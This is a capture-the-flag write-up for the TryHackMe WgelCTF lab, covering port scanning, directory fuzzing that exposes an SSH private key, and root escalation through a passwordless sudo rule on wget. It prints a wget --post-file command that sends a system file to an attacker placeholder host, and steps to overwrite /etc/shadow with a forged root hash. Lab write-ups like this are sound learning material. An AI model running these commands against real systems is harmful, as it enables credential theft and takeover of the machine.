--------------------

### CTF: TRYHACKME
### LAB: WGELCTF

---------------------

![image](https://github.com/user-attachments/assets/ce453493-74f0-490b-a5e1-ae61a8559e20)

---------------------

### RECONAISSANCE

- Rustscan's output

      ❯ rustscan -a 10.10.186.77 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Nmap? More like slowmap.🐢
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.186.77:22
      Open 10.10.186.77:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 15:37 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 15:37
      Completed NSE at 15:37, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 15:37
      Completed NSE at 15:37, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 15:37
      Completed NSE at 15:37, 0.00s elapsed
      Initiating Ping Scan at 15:37
      Scanning 10.10.186.77 [2 ports]
      Completed Ping Scan at 15:37, 0.16s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 15:37
      Completed Parallel DNS resolution of 1 host. at 15:37, 0.03s elapsed
      DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 15:37
      Scanning 10.10.186.77 [2 ports]
      Discovered open port 80/tcp on 10.10.186.77
      Discovered open port 22/tcp on 10.10.186.77
      Completed Connect Scan at 15:37, 0.52s elapsed (2 total ports)
      Initiating Service scan at 15:37
      Scanning 2 services on 10.10.186.77
      Completed Service scan at 15:37, 13.25s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.186.77.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 15:37
      Completed NSE at 15:38, 8.56s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 15:38
      Completed NSE at 15:38, 0.78s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 15:38
      Completed NSE at 15:38, 0.01s elapsed
      Nmap scan report for 10.10.186.77
      Host is up, received syn-ack (0.25s latency).
      Scanned at 2024-08-24 15:37:38 EDT for 24s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
      |   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
      |   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
      80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
      | http-methods: 
      |_  Supported Methods: POST OPTIONS GET HEAD
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      |_http-title: Apache2 Ubuntu Default Page: It works
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- I did directory fuzzing with FFUF and I discovered a directory `sitemap`.

![image](https://github.com/user-attachments/assets/478f763b-7fe8-4e1b-909e-b659d51e684a)

- I discovered a `.ssh` directory after fuzzing for files and directory with `raft_large_files` wordlist.

![image](https://github.com/user-attachments/assets/85fc1729-9460-4b5f-becc-692f32c7b17f)

- I found a username in the Apache server's default page source code.

![image](https://github.com/user-attachments/assets/84f1bc23-bad7-42ab-800f-e49f1a28f0cb)

- The `.ssh` directory contains an `id_rsa` file and I was able to access user `Jessie` with it via ssh.

![image](https://github.com/user-attachments/assets/9c4acbd6-0ad0-469b-97db-0ad9bf80e410)

- SSH Access

![image](https://github.com/user-attachments/assets/1c55d0cd-22f9-463f-86a3-8ec0fd888a1b)

-----------------------------

### PRIVESC with WGET

- Running `sudo -l` indicates a rule that user `Jessie` can run `/usr/bin/wget` binary without password as root.

![image](https://github.com/user-attachments/assets/dff419c9-b90a-492a-8f11-de17803b48b7)

### Sending /etc/shadow to our machine to edit the root hash

- I set up a listener on my machine to receive the file contents

![image](https://github.com/user-attachments/assets/5eb36459-08b2-4af4-a599-d653073a155b)

- I used this command to send the `/etc/shadow` file.

   Command:```sudo -u root /usr/bin/wget --post-file=/etc/passwd <ip>:<port>```

- File contents received over `nc`

![image](https://github.com/user-attachments/assets/5ef0a780-8326-478a-a580-580c402fca63)

- Generate a new hash with openssl

      #SHA512 hash
      openssl passwd -6 <password>

![image](https://github.com/user-attachments/assets/a857e147-61b4-422c-93ae-585fd06703e9)

- Hash format should be according to the format set below.Replace the root user's hash

      root:<hash>:18195:0:99999:7:::

- Set up a python `http.server` module.

![image](https://github.com/user-attachments/assets/12025c43-15f4-43d8-bb25-fed3c55e3ebb)

- Receive on the victim's machine with wget

      sudo -u root /usr/bin/wget http://<ip>:<port>/shadow -O <save location>

![image](https://github.com/user-attachments/assets/2fa53e7f-570c-4742-8555-8ffc87e96bbf)

- Su to root and input the new password

![image](https://github.com/user-attachments/assets/6016028c-b85c-49af-8986-e3c643a178a2)

- Root......

![image](https://github.com/user-attachments/assets/36b4d07f-79e6-433f-9f88-43163c43764d)


----------------------

### REFERENCE:

- [Wget's Privesc](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/)

----------------------
